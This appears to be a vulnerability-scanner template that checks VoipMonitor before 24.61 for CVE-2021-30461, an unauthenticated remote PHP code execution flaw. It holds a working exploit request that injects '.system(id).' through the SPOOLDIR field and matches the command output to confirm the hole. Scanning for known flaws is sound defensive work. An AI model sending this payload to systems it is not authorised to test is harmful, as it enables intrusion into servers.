id: CVE-2021-30461

info:
  name: VoipMonitor <24.61 - Remote Code Execution
  author: shifacyclewala,hackergautam
  severity: critical
  description: |
    VoipMonitor prior to 24.61 is susceptible to remote code execution vulnerabilities because of its use of user supplied data via its web interface, allowing  remote unauthenticated users to trigger a remote PHP code execution vulnerability.
  reference:
    - https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-30461
    - https://ssd-disclosure.com/ssd-advisory--voipmonitor-unauth-rce
    - http://wiki.peiqi.tech/wiki/serverapp/VoIPmonitor/VoIPmonitor%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-30461.html

rules:
  r0:
    request:
      method: POST
      path: /index.php
      body: |
        SPOOLDIR=test".system(id)."&recheck=Recheck
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0()